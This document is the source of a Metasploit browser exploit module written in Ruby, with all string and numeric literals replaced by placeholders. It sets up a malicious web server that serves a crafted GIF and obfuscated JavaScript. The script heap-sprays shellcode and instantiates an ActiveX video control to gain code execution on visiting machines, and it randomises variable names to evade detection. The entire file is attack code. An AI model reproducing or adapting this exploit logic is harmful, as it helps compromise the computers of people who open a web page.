require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] ] , <str> = > <str> , <str> = > <int> ) ) register_advanced_options ( [ OptString . new ( <str> , [ false , <str> , nil ] ) , ] , self . class ) @javascript_encode_key = rand_text_alpha ( rand ( <int> ) + <int> ) end def get_srvhost return datastore [ <str> ] if datastore [ <str> ] != <str> Rex :: Socket . source_address ( cli . peerhost ) end def on_request_uri ( cli , request ) if ( request . uri . match ( <str> ) ) print_status ( <str> ) gif = <str> gif << <str> gif << <str> gif << <str> gif << [ target . ret ] . pack ( <str> ) gif << <str> send_response ( cli , gif , { <str> = > <str> } ) return end if ( ! request . uri . match ( <str> ) ) send_local_redirect ( cli , <str> @javascript_encode_key <str> ) return end print_status ( <str> ) return if ( ( p = regenerate_payload ( cli ) ) == nil ) allclsids = [ <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , ] clsids = [ <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , ] classid = datastore [ <str> ] || clsids [ rand ( clsids . size ) ] shellcode = Rex :: Text . to_unescape ( payload . encoded , Rex :: Arch . endian ( target . arch ) ) nops = Rex :: Text . to_unescape ( [ target . ret ] . pack ( <str> ) ) blocksize = <hex> fillto = <int> msvidctl = rand_text_alpha ( rand ( <int> ) + <int> ) div = rand_text_alpha ( rand ( <int> ) + <int> ) j_shellcode = rand_text_alpha ( rand ( <int> ) + <int> ) j_nops = rand_text_alpha ( rand ( <int> ) + <int> ) j_headersize = rand_text_alpha ( rand ( <int> ) + <int> ) j_slackspace = rand_text_alpha ( rand ( <int> ) + <int> ) j_fillblock = rand_text_alpha ( rand ( <int> ) + <int> ) j_block = rand_text_alpha ( rand ( <int> ) + <int> ) j_memory = rand_text_alpha ( rand ( <int> ) + <int> ) j_counter = rand_text_alpha ( rand ( <int> ) + <int> ) host = get_srvhost + <str> + ( datastore [ <str> ] . to_s ) gif_uri = <str> ( datastore [ <str> ] ? <str> : <str> ) <str> host <str> if ( <str> == get_resource [ - <int> , <int> ] ) gif_uri << get_resource [ <int> , get_resource . length - <int> ] else gif_uri << get_resource end gif_uri << <str> + Time . now . to_i . to_s + <str> js = <str> j_shellcode <str> shellcode <str> j_nops <str> nops <str> j_headersize <str> j_slackspace <str> j_headersize <str> j_shellcode <str> j_nops <str> j_slackspace <str> j_nops <str> j_nops <str> j_fillblock <str> j_nops <str> j_slackspace <str> j_block <str> j_nops <str> j_nops <str> j_slackspace <str> j_block <str> j_slackspace <str> blocksize <str> j_block <str> j_block <str> j_block <str> j_fillblock <str> j_memory <str> j_counter <str> j_counter <str> fillto <str> j_counter <str> j_memory <str> j_counter <str> j_block <str> j_shellcode <str> msvidctl <str> div <str> msvidctl <str> msvidctl <str> msvidctl <str> msvidctl <str> gif_uri <str> msvidctl <str> classid <str> js_encoded = encrypt_js ( js , @javascript_encode_key ) html = <str> div <str> js_encoded <str> print_status ( <str> self . name <str> ) send_response ( cli , html , { <str> = > <str> } ) handler ( cli ) end end 
